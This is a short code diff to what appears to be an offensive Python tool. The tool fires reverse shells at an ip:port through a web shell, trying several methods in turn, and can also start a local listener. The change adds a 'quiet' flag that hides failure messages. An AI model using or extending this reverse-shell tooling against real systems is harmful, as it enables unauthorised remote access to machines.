@@ -65,6 +65,7 @@ def reverse_shell(
     port: int | str,
     method: str = "auto",
     attempt_timeout: float | None = None,
+    quiet: bool = False,
 ) -> bool:
     """Fire a reverse shell to ``ip:port``. Returns True once one fires.
 
@@ -75,6 +76,11 @@ def reverse_shell(
     the request hang, so we wait this long (the timeout is read as success)
     before moving to the next method, instead of blocking for the full transport
     timeout when a method's binary exists but never connects back.
+
+    ``quiet`` suppresses the per-method failure chatter — used by the local
+    listener path, where the *listener* (not the firer's HTTP return) is the
+    source of truth, so a shell that connects and then exits cleanly doesn't
+    print a misleading "no method succeeded".
     """
     port = str(int(port))
     methods = _AUTO_ORDER if method == "auto" else [method]
@@ -95,8 +101,10 @@ def reverse_shell(
             return True
         finally:
             ws.transport.config.timeout = original
-        log.warning(f"{name} returned without connecting; trying next method.")
-    log.error("No reverse-shell method succeeded.")
+        if not quiet:
+            log.warning(f"{name} returned without connecting; trying next method.")
+    if not quiet:
+        log.error("No reverse-shell method succeeded.")
     return False
 
 
@@ -144,7 +152,7 @@ def reverse_shell_with_listener(
     def _fire() -> None:
         time.sleep(1.0)
         with contextlib.suppress(Exception):
-            reverse_shell(ws, ip, port, method)
+            reverse_shell(ws, ip, port, method, quiet=True)
 
     threading.Thread(target=_fire, daemon=True).start()
     log.success(f"Listening on :{port} ({tool}); the shell should connect shortly.")
